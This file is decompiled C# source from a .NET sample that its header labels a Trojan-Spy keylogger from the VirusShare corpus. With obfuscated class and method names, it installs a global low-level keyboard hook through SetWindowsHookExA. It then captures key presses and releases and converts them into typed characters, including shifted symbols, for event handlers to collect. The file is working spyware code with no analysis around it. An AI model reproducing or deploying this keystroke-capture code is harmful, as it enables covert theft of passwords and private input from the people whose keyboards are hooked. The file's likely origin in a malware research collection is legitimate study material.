// Decompiled with JetBrains decompiler
// Type: GUlBzjdJZuXUZ
// Assembly: dfasdfasdfa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC4AEAF-CB32-40A7-93E4-1293140F4D9C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.aqg-c67e985033bef3e2aef9ddea765a52d9924c3eaf56bd0f89fed02eca4dcc4ed2.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class GUlBzjdJZuXUZ
{
  private static int kKhkokmCeJtIL;
  private static GUlBzjdJZuXUZ.ASvYaVgwkYxIH CnNbJKspONJRx;

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int JkEDoGvEtrDNw(
    int OVixQZpDOdrXQ,
    GUlBzjdJZuXUZ.ASvYaVgwkYxIH PtwVsZbphJSgl,
    int KarfsBaOXggJJ,
    int xoTigSPnRdwgV);

  [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int rSyKgXrYQAbDD(
    int OVixQZpDOdrXQ,
    int tTQGvBoPLHQNS,
    int pOhAHcyUuPjyI,
    ref GUlBzjdJZuXUZ.zWmTJkgAgppfp ETDCsoKFkSJxT);

  [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int WBcjPdLkrVgPN(int OVixQZpDOdrXQ);

  public static event GUlBzjdJZuXUZ.xznKgAJnisfNwEventHandler xznKgAJnisfNw;

  public static event GUlBzjdJZuXUZ.JcJpCktjOpApbEventHandler JcJpCktjOpApb;

  public void ylfbkIvDnbUPN()
  {
    GUlBzjdJZuXUZ.CnNbJKspONJRx = new GUlBzjdJZuXUZ.ASvYaVgwkYxIH(this.eRrUpQbNYJhZS);
    GUlBzjdJZuXUZ.kKhkokmCeJtIL = GUlBzjdJZuXUZ.JkEDoGvEtrDNw(13, GUlBzjdJZuXUZ.CnNbJKspONJRx, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int eRrUpQbNYJhZS(
    int hJfLUaVFOtnuO,
    int pOhAHcyUuPjyI,
    ref GUlBzjdJZuXUZ.zWmTJkgAgppfp ETDCsoKFkSJxT)
  {
    if (hJfLUaVFOtnuO == 0)
    {
      switch (pOhAHcyUuPjyI)
      {
        case 256:
        case 260:
          GUlBzjdJZuXUZ.xznKgAJnisfNwEventHandler xznKgAjnisfNwEvent = GUlBzjdJZuXUZ.xznKgAJnisfNwEvent;
          if (xznKgAjnisfNwEvent != null)
          {
            xznKgAjnisfNwEvent(this.kAWsZmNeBShsb((Keys) ETDCsoKFkSJxT.hJfLUaVFOtnuO));
            break;
          }
          break;
        case 257:
        case 261:
          GUlBzjdJZuXUZ.JcJpCktjOpApbEventHandler jpCktjOpApbEvent = GUlBzjdJZuXUZ.JcJpCktjOpApbEvent;
          if (jpCktjOpApbEvent != null)
          {
            jpCktjOpApbEvent(this.kAWsZmNeBShsb((Keys) ETDCsoKFkSJxT.hJfLUaVFOtnuO));
            break;
          }
          break;
      }
    }
    return GUlBzjdJZuXUZ.rSyKgXrYQAbDD(GUlBzjdJZuXUZ.kKhkokmCeJtIL, hJfLUaVFOtnuO, pOhAHcyUuPjyI, ref ETDCsoKFkSJxT);
  }

  public void PhBaOrArmmuuz()
  {
    GUlBzjdJZuXUZ.WBcjPdLkrVgPN(GUlBzjdJZuXUZ.kKhkokmCeJtIL);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  private string kAWsZmNeBShsb(Keys rBNTwUJxRpPsY)
  {
    Keys keys = rBNTwUJxRpPsY;
    if (keys >= Keys.A && keys <= Keys.Z)
      return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? rBNTwUJxRpPsY.ToString() : rBNTwUJxRpPsY.ToString().ToLower();
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return rBNTwUJxRpPsY.ToString().Replace("D", (string) null);
      string Left = rBNTwUJxRpPsY.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return rBNTwUJxRpPsY.ToString().Replace("NumPad", (string) null);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = rBNTwUJxRpPsY.ToString();
        if (Operators.CompareString(Left, "Divide", false) == 0)
          return "/";
        if (Operators.CompareString(Left, "Multiply", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "Subtract", false) == 0)
          return "-";
        if (Operators.CompareString(Left, "Add", false) == 0)
          return "+";
        if (Operators.CompareString(Left, "Decimal", false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = rBNTwUJxRpPsY.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "_";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "{";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "}";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "|";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ":";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "\"";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return "<";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ">";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "?";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "~";
          }
          else
          {
            string Left = rBNTwUJxRpPsY.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "=";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "[";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "]";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "\\";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ";";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "'";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return ",";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ".";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? Environment.NewLine : "<" + rBNTwUJxRpPsY.ToString() + ">";
      }
    }
    return (string) null;
  }

  private delegate int ASvYaVgwkYxIH(
    int tTQGvBoPLHQNS,
    int pOhAHcyUuPjyI,
    ref GUlBzjdJZuXUZ.zWmTJkgAgppfp ETDCsoKFkSJxT);

  public delegate void xznKgAJnisfNwEventHandler(string kKhkokmCeJtIL);

  public delegate void JcJpCktjOpApbEventHandler(string kKhkokmCeJtIL);

  private struct zWmTJkgAgppfp
  {
    public int hJfLUaVFOtnuO;
    public int JnwEUAkhUzEIO;
    public int oLVJVojHfVVSX;
    public int aCuGHCnXpQxYe;
    public int lHtftDsJBGmPh;
  }
}
